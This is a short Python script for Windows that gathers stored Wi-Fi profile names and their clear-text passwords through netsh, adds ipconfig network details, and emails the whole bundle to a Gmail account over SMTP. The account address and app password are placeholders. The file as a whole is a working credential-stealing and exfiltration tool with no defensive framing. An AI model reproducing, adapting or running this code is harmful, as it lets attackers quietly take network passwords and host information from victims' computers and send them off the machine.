#!/usr/bin/env python
import subprocess
import smtplib
import re

def send_mail(email, app_password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, app_password)
    server.sendmail(email, email, message)
    server.quit()

def get_wifi_profiles():
    try:
        # Run the netsh command to get the Wi-Fi profiles
        result = subprocess.check_output(["netsh", "wlan", "show", "profiles"], universal_newlines=True)
        return result

    except subprocess.CalledProcessError as e:
        return f"Error: {e}"

def get_wifi_key():
    try:
        # Run the netsh command to get the Wi-Fi profile information
        result = subprocess.check_output(["netsh", "wlan", "show", "profiles"], universal_newlines=True)
        
        # Use regular expressions to extract profile names
        profile_names = re.findall(r"\s*All User Profile\s*:\s*(.*)", result)

        # Initialize a variable to store the final result
        final_result = ""

        # Loop through each profile and get the key
        for profile_name in profile_names:
            # Run the netsh command to get the key for the profile
            key_result = subprocess.check_output(["netsh", "wlan", "show", "profile", "name=" + profile_name, "key=clear"], universal_newlines=True)
            
            # Use regular expressions to extract the key
            key = re.search(r"\s*Key Content\s*:\s*(.*)", key_result)
            
            # Append the profile name and key to the final result
            if key:
                final_result += f"Wi-Fi Profile: {profile_name}\nWi-Fi Key: {key.group(1)}\n------------------------\n"

        return final_result

    except subprocess.CalledProcessError as e:
        return f"Error: {e}"

# Call the function to get Wi-Fi profile information
wifi_profiles_info = get_wifi_profiles()

# Call the function to get Wi-Fi key information
wifi_key_info = get_wifi_key()

# If you want to include the Wi-Fi profiles and key information in the email, you can append them to the result variable
email = "xxxxxx@xxx.xxxx"
app_password = "xxxxxxxxxxx"
command = "ipconfig"
result = subprocess.check_output(command, shell=True)
message = f"{wifi_profiles_info}\n\n{result}\n\n{wifi_key_info}"

# Call the send_mail function with the updated message
send_mail(email, app_password, message)
